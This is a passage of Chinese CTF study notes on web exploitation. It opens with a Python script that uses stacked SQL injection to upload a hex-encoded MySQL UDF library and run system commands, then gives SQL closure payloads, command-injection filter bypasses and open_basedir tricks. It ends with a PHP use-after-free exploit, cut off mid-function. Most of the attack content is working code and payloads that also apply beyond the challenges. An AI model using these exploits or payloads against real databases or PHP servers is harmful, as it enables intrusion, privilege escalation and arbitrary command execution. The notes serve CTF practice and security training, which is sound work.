[https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83](https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83)

- 全称是 **User defined function**(用户自定义函数)，对基础权限要求很高的，要求数据库 root 权限
- 当我们有读取和写入权限以后，我们就可以尝试使用 udf 提权的方法，从数据库的 root 权限提升到 系统的管理员权限
```python
#参考脚本
#环境：Linux/MariaDB
import requests
 
url='http://6a4ab9f6-0c09-45b7-ad8c-280e5f9ce6e9.challenge.ctf.show/api/?id='


code='7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400'
codes=[]
for i in range(0,len(code),128):
    codes.append(code[i:min(i+128,len(code))])
 
#建临时表
sql='''create table temp(data longblob)'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#清空临时表
sql='''delete from temp'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#插入第一段数据
sql='''insert into temp(data) values (0x{})'''.format(codes[0])
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#更新连接剩余数据
for k in range(1,len(codes)):
    sql='''update temp set data = concat(data,0x{})'''.format(codes[k])
    payload='''0';{};-- A'''.format(sql)
    requests.get(url+payload)
 
#10.3.18-MariaDB    
#写入so文件
sql='''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#引入自定义函数
sql='''create function sys_eval returns string soname 'udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#命令执行，结果更新到界面
sql='''update ctfshow_user set pass=(select sys_eval('cat /flag.her?'))'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#查看结果
r=requests.get(url[:-4]+'?page=1&limit=10')
print(r.text)
```

- sys_eval是执行系统命令



## 神奇闭合

### Insert

#### 0x01

- 可注入语句
```sql
INSERT INTO(filename,filepath,filetype) values('".$filename"','".$filepath"','".$filetype."')
```

- 如果filetype存在注入，那么可以
```sql
PC64 Emulator file""');select flag into file '/var/www/html/2.php';--+

#sql语句变成了下面的，本质上是堆叠注入

INSERT INTO(filename,filepath,filetype) values('".$filename"','".$filepath"',
'"PC64 Emulator file"');select flag into file '/var/www/html/2.php';--+"')
```
![29d7f5eea86063a7aa55a579ff0e20c.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001951695-b0bd80a3-6866-4088-a37c-f06638c3fe79.png#averageHue=%23352321&clientId=u28f216fd-6910-4&from=paste&height=70&id=TR7bK&originHeight=140&originWidth=2809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35346&status=done&style=none&taskId=ub249bd91-481e-43eb-9835-bfa2ce6e67b&title=&width=1404.5)

### update

#### 0x01

```sql
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

- 这里可以先对Password处闭合，大括号可以不用管
```sql
password = 1',username = select group_concat(/*爆破信息*/) where 1=1#&username = 1

#sql语句就变成了

update ctfshow_user set pass = '1',username = select group_concat(/*爆破信息*/) 
where 1=1 #where username = '1';
```

- 如果过滤了单引号，考虑用\转义
```sql
password = \&username =,username= (select group_concat(/*爆破信息*/))#

#sql语句变成了

$sql = "update ctfshow_user set pass = '\' where username = ',
username= (select group_concat(/*爆破信息*/))#';";
```

- 这里一定要注意username=()中的括号，括号里面添加语句或者函数
## 总结
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1683367334674-ccb86bee-4e2b-4298-82b6-4eb03200286b.jpeg)
# 
# 
# 
# 
# 
# 4. php_rce

-  点开场景后，发现是thinkphp框架
-  输入一个不存在的页面，查看thinkphp版本 
```
http://61.147.171.105:49734/index.php/login
```

-  百度查poc，直接用即可 
```
find / -name "flag"
cat /flag
```
# 5. 命令执行
## 花式绕过
### 符号绕过

[命令执行漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/company-information/228881.html)

```
windows 或 linux 下:
command1 && command2 先执行 command1，如果为真，再执行 command2
command1 | command2 只执行 command2
command1 & command2 先执行 command2 后执行 command1
command1 || command2 先执行 command1，如果为假，再执行 command2
命令执行漏洞（| || & && 称为 管道符）
command1 ; command2 执行command1结束后执行command2
```

-  有时候find / -name "flag"可能找不到，试试改变后缀 
```
find / -name "flag.txt"
find / -name "flag.php"
```
 

-  &&用的时候需要变成url编码，%26%26 

### 绕过cat(需要查看源代码)

#### nl命令

`nl`可以将输出的文件内容自动的加上行号

#### tac命令

#### cp命令

#### mv命令

-  mv是重命名 
```
mv flag.php 1.txt
```
 

-  直接访问1.txt即可 
#### 直接执行

- 如果一个文件名是readflag，在根目录下，无后缀，那么用cat可能查看不了，那么直接执行，将输出的结果放到1.txt中
```php
<?php system('/readflag > /var/www/html/1.txt')?>
```
### 绕过空格

#### <命令

- `<` 表示的是输入重定向的意思，就是把`<`后面跟的文件取代键盘作为新的输入设备
- 可以使用`<`或者`<>`绕过空格

#### %09(system)

- 这里过滤了system的空格，%09表示制表符tab，可以绕过过滤

#### ![](https://g.yuque.com/gr/latex?IFS%E6%88%96#card=math&code=IFS%E6%88%96&id=hmVf3){IFS}

- 它是分隔符，默认是`\t\n`
- 可以指定成其他的

#### ‘’或\

-  ''或者\不影响命令的正常执行 
```shell
nl<fla"g.php
```
#### ?代替任意字符

- 在shell条件下

```php
flag.txt -> fl?g.txt
```

#### .命令

-  .命令相当于source，用于执行文件(注意中间的空格) 
```php
. /a.txt
```

### 绕过system
#### 反引号绕过

-  反引号和system一样，都是shell执行 
```php
`cp flag.txt 1.txt`
```
####  shell_exec绕过system

#### passthru绕过system
[https://www.php.net/manual/zh/function.passthru.php](https://www.php.net/manual/zh/function.passthru.php)

### 嵌套绕过

-  用嵌套eval绕过 
```php
c=eval($_GET[1]);&1=phpinfo();
```
 

   - 后面的1逃逸出去了，可以执行任意命令

### 绕过(

##### %0a

-  %0a表示换行符，可以绕过对括号的限制 
```
include%0aflag.php?>
include '/var/www/html/flag.php'
include'/var/www/html/flag.php'
```

- include后可以没有空格
##### 语言结构

- `echo print issert unset include require`都不需要括号

### ?>绕过分号；

- php的最后一个语句可以没有分号，用?>表示代码结束
### exit()退出绕过replace
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1666858807985-969e82af-ab7f-45f0-b5ee-62a88cfe6576.png#averageHue=%2321201e&clientId=uc84a7769-fc82-4&from=paste&height=311&id=ub8b4f8df&originHeight=622&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77070&status=done&style=none&taskId=u6bbf8629-5fd3-4d0d-b8de-257fe49d300&title=&width=481.5)
```php
c=include('/flag.txt');exit();
```
### 绕过open_basedir
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1666886609959-55304ba1-e868-41a8-9445-34b09ff89748.png#averageHue=%23f2f1f0&clientId=u885ed144-4531-4&from=paste&height=182&id=udc39b8b0&originHeight=363&originWidth=2292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91537&status=done&style=none&taskId=u18743aee-de18-4351-b3ad-cf424e3b69b&title=&width=1146)
##### glob伪协议

- 查找匹配的文件模式
- glob伪协议在筛选目录时不受open_basedir制约
```
<?php
c=$a = "glob:///*";//读取/目录下的所有文件
if ($b=opendir($a)){
	while (($file = readdir($b)) !== false ) {
		echo "filename:".$file."<br>" ;
	}
closedir($b);}
exit();
>
```

- 这里c是post参数
#### uaf绕过open_basedir执行命令

- 用c=下面的内容，去掉前面的<?，对下面的php代码进行url编码
```php
<?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
